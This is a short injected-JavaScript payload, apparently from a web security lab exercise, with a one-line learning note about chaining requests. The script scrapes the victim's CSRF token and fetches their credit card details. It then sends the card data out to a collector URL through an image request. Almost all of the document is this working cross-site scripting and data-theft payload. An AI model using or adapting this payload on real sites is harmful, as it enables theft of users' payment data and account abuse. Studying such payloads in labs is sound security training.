<script>
	var xhttp = new XMLHttpRequest();
	var val = '';
	var uid = document.getElementById('settings').innerHTML.slice(22);
	var url = document.getElementById('settings').href;
	xhttp.open('GET',url,true);
	xhttp.responseType = 'document';
	xhttp.onreadystatechange = function() {
		if(this.readyState == 4 && this.status == 200){
			var csrf = this.responseXML.getElementsByTagName('input')[1].value;
			var req = new XMLHttpRequest();
			req.open('GET','/lab/webapp/jfp/19/getcreditcard?uid='+uid+'&csrf_token='+csrf,true);
			req.responseType = 'document';
			req.send();
			req.onreadystatechange = function(){
				if(this.readyState == 4 && this.status == 200){
					val = this.responseXML.getElementById('result').innerHTML;
					document.getElementById('result').innerHTML=val;
					new Image().src = 'http://127.0.0.1/?'+val;
				}
			};
		}
	};
xhttp.send();
</script>



things learned,
	we can nest two or more xhttp request to use the data from the previous request to initiate the other requests thus making the attack more dynamic
